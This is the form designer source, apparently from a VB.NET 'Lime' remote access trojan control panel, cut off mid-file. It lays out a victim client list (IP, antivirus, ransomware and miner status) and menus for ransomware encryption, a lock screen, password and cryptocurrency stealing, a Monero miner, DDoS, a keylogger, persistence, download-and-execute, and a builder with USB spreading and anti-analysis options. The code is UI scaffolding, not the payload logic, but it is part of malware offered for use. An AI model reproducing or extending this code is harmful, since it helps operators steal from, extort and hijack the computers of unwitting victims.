﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Main
    Inherits MetroFramework.Forms.MetroForm

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main))
        Me.MetroTabControl1 = New MetroFramework.Controls.MetroTabControl()
        Me.MetroTabPage1 = New MetroFramework.Controls.MetroTabPage()
        Me.L1 = New System.Windows.Forms.ListView()
        Me.Country = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.IP = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ID = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.USERN = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.VER = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.OS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.INSDATE = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.AV = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.RANS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.XMR = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.SP = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me._PORT = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.DotNET = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.PING = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.NOTE_ = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Main_Rightclick = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.PluginsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RansomwareToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EncryptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DecryptionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LockScreenToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.STARTToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.STOPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FIleManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DetailsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CryptocurrencyStealerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.XMRMinerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DDoSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EnableWindowsRDPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.DownloadAndExecuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.MiscellaneousToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.VisitWebsiteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunAsAdministratorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyloggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PersistenceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotPCOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCRestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCLogoutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ControllerOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateFromURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
        Me.ListviewOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClientColorToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClientNoteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClientFolderToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoveOfflineToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
        Me.OnConnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator4 = New System.Windows.Forms.ToolStripSeparator()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Flag = New System.Windows.Forms.ImageList(Me.components)
        Me.MetroTabPage4 = New MetroFramework.Controls.MetroTabPage()
        Me.CAPsec = New System.Windows.Forms.NumericUpDown()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.CAPstart = New MetroFramework.Controls.MetroButton()
        Me.L3 = New System.Windows.Forms.ListView()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.MetroTabPage2 = New MetroFramework.Controls.MetroTabPage()
        Me.L2 = New System.Windows.Forms.ListBox()
        Me.MetroTabPage3 = New MetroFramework.Controls.MetroTabPage()
        Me.chkRename = New MetroFramework.Controls.MetroCheckBox()
        Me.radioNET4 = New MetroFramework.Controls.MetroRadioButton()
        Me.radioNET2 = New MetroFramework.Controls.MetroRadioButton()
        Me.MetroButton1 = New MetroFramework.Controls.MetroButton()
        Me.MetroPanel5 = New MetroFramework.Controls.MetroPanel()
        Me._icon = New MetroFramework.Controls.MetroCheckBox()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.MetroPanel4 = New MetroFramework.Controls.MetroPanel()
        Me._numDelay = New System.Windows.Forms.NumericUpDown()
        Me.MetroLabel11 = New MetroFramework.Controls.MetroLabel()
        Me.MetroLabel10 = New MetroFramework.Controls.MetroLabel()
        Me._dwnchk = New MetroFramework.Controls.MetroCheckBox()
        Me._dwnlink = New MetroFramework.Controls.MetroTextBox()
        Me.MetroLabel9 = New MetroFramework.Controls.MetroLabel()
        Me._btc = New MetroFramework.Controls.MetroTextBox()
        Me.MetroLabel8 = New MetroFramework.Controls.MetroLabel()
        Me._pin = New MetroFramework.Controls.MetroCheckBox()
        Me._usb = New MetroFramework.Controls.MetroCheckBox()
        Me._anti = New MetroFramework.Controls.MetroCheckBox()
        Me.MetroPanel3 = New MetroFramework.Controls.MetroPanel()
        Me.MetroLabel12 = New MetroFramework.Controls.MetroLabel()
        Me._path1 = New MetroFramework.Controls.MetroComboBox()
        Me.MetroLabel7 = New MetroFramework.Controls.MetroLabel()
        Me._path2 = New MetroFramework.Controls.MetroTextBox()
        Me.MetroLabel6 = New MetroFramework.Controls.MetroLabel()
        Me._drop = New MetroFramework.Controls.MetroToggle()
        Me.MetroLabel5 = New MetroFramework.Controls.MetroLabel()
        Me._exe = New MetroFramework.Controls.MetroTextBox()
        Me.MetroPanel2 = New MetroFramework.Controls.MetroPanel()
        Me.MetroTile1 = New MetroFramework.Controls.MetroTile()
        Me._pastebin = New MetroFramework.Controls.MetroTextBox()
        Me.MetroLabel4 = New MetroFramework.Controls.MetroLabel()
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.LabelUpdate = New System.Windows.Forms.Timer(Me.components)
        Me.MetroLabel1 = New MetroFramework.Controls.MetroLabel()
        Me.MetroPanel1 = New MetroFramework.Controls.MetroPanel()
        Me.MetroLabel2 = New MetroFramework.Controls.MetroLabel()
        Me.MetroToggle1 = New MetroFramework.Controls.MetroToggle()
        Me.MetroLabel3 = New MetroFramework.Controls.MetroLabel()
        Me.MetroProgressSpinner1 = New MetroFramework.Controls.MetroProgressSpinner()
        Me.MetroStyleManager1 = New MetroFramework.Components.MetroStyleManager(Me.components)
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.MetroStyleExtender1 = New MetroFramework.Components.MetroStyleExtender(Me.components)
        Me.MetroToolTip1 = New MetroFramework.Components.MetroToolTip()
        Me.PingClients = New System.Windows.Forms.Timer(Me.components)
        Me.AutoUpdate = New System.Windows.Forms.Timer(Me.components)
        Me.CAP = New System.Windows.Forms.Timer(Me.components)
        Me.MetroTabControl1.SuspendLayout()
        Me.MetroTabPage1.SuspendLayout()
        Me.Main_Rightclick.SuspendLayout()
        Me.MetroTabPage4.SuspendLayout()
        CType(Me.CAPsec, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.MetroTabPage2.SuspendLayout()
        Me.MetroTabPage3.SuspendLayout()
        Me.MetroPanel5.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.MetroPanel4.SuspendLayout()
        CType(Me._numDelay, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.MetroPanel3.SuspendLayout()
        Me.MetroPanel2.SuspendLayout()
        Me.MetroPanel1.SuspendLayout()
        CType(Me.MetroStyleManager1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'MetroTabControl1
        '
        Me.MetroTabControl1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.MetroTabControl1.Appearance = System.Windows.Forms.TabAppearance.FlatButtons
        Me.MetroTabControl1.Controls.Add(Me.MetroTabPage1)
        Me.MetroTabControl1.Controls.Add(Me.MetroTabPage4)
        Me.MetroTabControl1.Controls.Add(Me.MetroTabPage2)
        Me.MetroTabControl1.Controls.Add(Me.MetroTabPage3)
        Me.MetroTabControl1.FontSize = MetroFramework.MetroTabControlSize.Tall
        Me.MetroTabControl1.FontWeight = MetroFramework.MetroTabControlWeight.Bold
        Me.MetroTabControl1.Location = New System.Drawing.Point(23, 73)
        Me.MetroTabControl1.Name = "MetroTabControl1"
        Me.MetroTabControl1.SelectedIndex = 0
        Me.MetroTabControl1.Size = New System.Drawing.Size(1622, 547)
        Me.MetroTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.MetroTabControl1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroTabControl1.TabIndex = 0
        Me.MetroTabControl1.Tag = "0"
        Me.MetroTabControl1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        Me.MetroTabControl1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroTabPage1
        '
        Me.MetroTabPage1.Controls.Add(Me.L1)
        Me.MetroTabPage1.HorizontalScrollbarBarColor = True
        Me.MetroTabPage1.Location = New System.Drawing.Point(4, 42)
        Me.MetroTabPage1.Name = "MetroTabPage1"
        Me.MetroTabPage1.Size = New System.Drawing.Size(1614, 501)
        Me.MetroTabPage1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroTabPage1.TabIndex = 0
        Me.MetroTabPage1.Text = "Clients"
        Me.MetroTabPage1.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroTabPage1.VerticalScrollbarBarColor = True
        '
        'L1
        '
        Me.L1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.L1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Country, Me.IP, Me.ID, Me.USERN, Me.VER, Me.OS, Me.INSDATE, Me.AV, Me.RANS, Me.XMR, Me.SP, Me._PORT, Me.DotNET, Me.PING, Me.NOTE_})
        Me.L1.ContextMenuStrip = Me.Main_Rightclick
        Me.L1.Font = New System.Drawing.Font("Segoe UI", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.L1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.L1.FullRowSelect = True
        Me.L1.Location = New System.Drawing.Point(0, 25)
        Me.L1.Name = "L1"
        Me.L1.OwnerDraw = True
        Me.L1.ShowGroups = False
        Me.L1.ShowItemToolTips = True
        Me.L1.Size = New System.Drawing.Size(1614, 449)
        Me.L1.SmallImageList = Me.Flag
        Me.L1.TabIndex = 2
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'Country
        '
        Me.Country.Text = " Country "
        Me.Country.Width = 100
        '
        'IP
        '
        Me.IP.Text = " IP Address "
        Me.IP.Width = 100
        '
        'ID
        '
        Me.ID.Text = " User ID "
        Me.ID.Width = 100
        '
        'USERN
        '
        Me.USERN.Text = " User Name "
        Me.USERN.Width = 110
        '
        'VER
        '
        Me.VER.Text = " Version "
        Me.VER.Width = 100
        '
        'OS
        '
        Me.OS.Text = " Operation System "
        Me.OS.Width = 100
        '
        'INSDATE
        '
        Me.INSDATE.Text = "Installed"
        Me.INSDATE.Width = 100
        '
        'AV
        '
        Me.AV.Text = " Anti Virus "
        Me.AV.Width = 100
        '
        'RANS
        '
        Me.RANS.Text = " Ransomware "
        Me.RANS.Width = 100
        '
        'XMR
        '
        Me.XMR.Text = " XMR "
        Me.XMR.Width = 100
        '
        'SP
        '
        Me.SP.Text = " Spread "
        Me.SP.Width = 100
        '
        '_PORT
        '
        Me._PORT.Text = "Port"
        '
        'DotNET
        '
        Me.DotNET.Text = " Dependency "
        '
        'PING
        '
        Me.PING.Text = " Ping "
        Me.PING.Width = 100
        '
        'NOTE_
        '
        Me.NOTE_.Text = " Note "
        Me.NOTE_.Width = 100
        '
        'Main_Rightclick
        '
        Me.Main_Rightclick.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.Main_Rightclick.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
        Me.Main_Rightclick.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Main_Rightclick.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.Main_Rightclick.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PluginsToolStripMenuItem, Me.ToolStripSeparator1, Me.DownloadAndExecuteToolStripMenuItem, Me.MiscellaneousToolStripMenuItem, Me.BotPCOptionsToolStripMenuItem, Me.ControllerOptionsToolStripMenuItem, Me.ToolStripSeparator2, Me.ListviewOptionsToolStripMenuItem, Me.ToolStripSeparator3, Me.OnConnectToolStripMenuItem, Me.ToolStripSeparator4, Me.AboutToolStripMenuItem})
        Me.Main_Rightclick.Name = "ContextMenuStrip1"
        Me.Main_Rightclick.ShowImageMargin = False
        Me.Main_Rightclick.Size = New System.Drawing.Size(216, 269)
        '
        'PluginsToolStripMenuItem
        '
        Me.PluginsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PluginsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RansomwareToolStripMenuItem, Me.LockScreenToolStripMenuItem, Me.FIleManagerToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem, Me.DetailsToolStripMenuItem, Me.PasswordsToolStripMenuItem, Me.CryptocurrencyStealerToolStripMenuItem, Me.XMRMinerToolStripMenuItem, Me.DDoSToolStripMenuItem, Me.EnableWindowsRDPToolStripMenuItem})
        Me.PluginsToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.PluginsToolStripMenuItem.Name = "PluginsToolStripMenuItem"
        Me.PluginsToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.PluginsToolStripMenuItem.Text = "Plugins"
        '
        'RansomwareToolStripMenuItem
        '
        Me.RansomwareToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.RansomwareToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.EncryptToolStripMenuItem, Me.DecryptionToolStripMenuItem})
        Me.RansomwareToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem"
        Me.RansomwareToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.RansomwareToolStripMenuItem.Text = "Lime Ransomware"
        '
        'EncryptToolStripMenuItem
        '
        Me.EncryptToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.EncryptToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem"
        Me.EncryptToolStripMenuItem.Size = New System.Drawing.Size(172, 30)
        Me.EncryptToolStripMenuItem.Text = "Encrypt"
        '
        'DecryptionToolStripMenuItem
        '
        Me.DecryptionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.DecryptionToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DecryptionToolStripMenuItem.Name = "DecryptionToolStripMenuItem"
        Me.DecryptionToolStripMenuItem.Size = New System.Drawing.Size(172, 30)
        Me.DecryptionToolStripMenuItem.Text = "Decryption"
        '
        'LockScreenToolStripMenuItem
        '
        Me.LockScreenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.LockScreenToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.STARTToolStripMenuItem, Me.STOPToolStripMenuItem})
        Me.LockScreenToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.LockScreenToolStripMenuItem.Name = "LockScreenToolStripMenuItem"
        Me.LockScreenToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.LockScreenToolStripMenuItem.Text = "Lock Screen"
        '
        'STARTToolStripMenuItem
        '
        Me.STARTToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.STARTToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.STARTToolStripMenuItem.Name = "STARTToolStripMenuItem"
        Me.STARTToolStripMenuItem.Size = New System.Drawing.Size(128, 30)
        Me.STARTToolStripMenuItem.Text = "Start"
        '
        'STOPToolStripMenuItem
        '
        Me.STOPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.STOPToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.STOPToolStripMenuItem.Name = "STOPToolStripMenuItem"
        Me.STOPToolStripMenuItem.Size = New System.Drawing.Size(128, 30)
        Me.STOPToolStripMenuItem.Text = "Stop"
        '
        'FIleManagerToolStripMenuItem
        '
        Me.FIleManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.FIleManagerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.FIleManagerToolStripMenuItem.Name = "FIleManagerToolStripMenuItem"
        Me.FIleManagerToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.FIleManagerToolStripMenuItem.Text = "File Manager"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.RemoteDesktopToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'DetailsToolStripMenuItem
        '
        Me.DetailsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.DetailsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DetailsToolStripMenuItem.Name = "DetailsToolStripMenuItem"
        Me.DetailsToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.DetailsToolStripMenuItem.Text = "System Details"
        '
        'PasswordsToolStripMenuItem
        '
        Me.PasswordsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PasswordsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PasswordsToolStripMenuItem.Name = "PasswordsToolStripMenuItem"
        Me.PasswordsToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.PasswordsToolStripMenuItem.Text = "Passwords Stealer"
        '
        'CryptocurrencyStealerToolStripMenuItem
        '
        Me.CryptocurrencyStealerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.CryptocurrencyStealerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.CryptocurrencyStealerToolStripMenuItem.Name = "CryptocurrencyStealerToolStripMenuItem"
        Me.CryptocurrencyStealerToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.CryptocurrencyStealerToolStripMenuItem.Text = "Cryptocurrency Stealer"
        Me.CryptocurrencyStealerToolStripMenuItem.ToolTipText = "Client must be .NET 4.0"
        '
        'XMRMinerToolStripMenuItem
        '
        Me.XMRMinerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.XMRMinerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.XMRMinerToolStripMenuItem.Name = "XMRMinerToolStripMenuItem"
        Me.XMRMinerToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.XMRMinerToolStripMenuItem.Text = "Monero Miner"
        '
        'DDoSToolStripMenuItem
        '
        Me.DDoSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.DDoSToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DDoSToolStripMenuItem.Name = "DDoSToolStripMenuItem"
        Me.DDoSToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.DDoSToolStripMenuItem.Text = "DDoS"
        '
        'EnableWindowsRDPToolStripMenuItem
        '
        Me.EnableWindowsRDPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.EnableWindowsRDPToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.EnableWindowsRDPToolStripMenuItem.Name = "EnableWindowsRDPToolStripMenuItem"
        Me.EnableWindowsRDPToolStripMenuItem.Size = New System.Drawing.Size(260, 30)
        Me.EnableWindowsRDPToolStripMenuItem.Text = "Enable Windows RDP"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(212, 6)
        '
        'DownloadAndExecuteToolStripMenuItem
        '
        Me.DownloadAndExecuteToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem, Me.FromURLToolStripMenuItem1})
        Me.DownloadAndExecuteToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DownloadAndExecuteToolStripMenuItem.Name = "DownloadAndExecuteToolStripMenuItem"
        Me.DownloadAndExecuteToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.DownloadAndExecuteToolStripMenuItem.Text = "Download&Execute"
        '
        'FromDiskToolStripMenuItem
        '
        Me.FromDiskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.FromDiskToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(167, 30)
        Me.FromDiskToolStripMenuItem.Text = "From Disk"
        Me.FromDiskToolStripMenuItem.ToolTipText = "For small file size"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.FromURLToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(167, 30)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        Me.FromURLToolStripMenuItem1.ToolTipText = "For large file size"
        '
        'MiscellaneousToolStripMenuItem
        '
        Me.MiscellaneousToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.VisitWebsiteToolStripMenuItem, Me.RunAsAdministratorToolStripMenuItem, Me.KeyloggerToolStripMenuItem, Me.PersistenceToolStripMenuItem})
        Me.MiscellaneousToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.MiscellaneousToolStripMenuItem.Name = "MiscellaneousToolStripMenuItem"
        Me.MiscellaneousToolStripMenuItem.Size = New System.Drawing.Size(215, 26)
        Me.MiscellaneousToolStripMenuItem.Text = "Miscellaneous"
        '
        'VisitWebsiteToolStripMenuItem
        '
        Me.VisitWebsiteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.VisitWebsiteToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.VisitWebsiteToolStripMenuItem.Name = "VisitWebsiteToolStripMenuItem"
        Me.VisitWebsiteToolStripMenuItem.Size = New System.Drawing.Size(247, 30)
        Me.VisitWebsiteToolStripMenuItem.Text = "Visit website"
        '
        'RunAsAdministratorToolStripMenuItem
        '
        Me.RunAsAdministratorToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.RunAsAdministratorToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RunAsAdministratorToolStripMenuItem.Name = "RunAsAdministratorToolStripMenuItem"
        Me.RunAsAdministratorToolStripMenuItem.Size = New System.Drawing.Size(247, 30)
        Me.RunAsAdministratorToolStripMenuItem.Text = "Run as administrator"
        '
        'KeyloggerToolStripMenuItem
        '
        Me.KeyloggerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
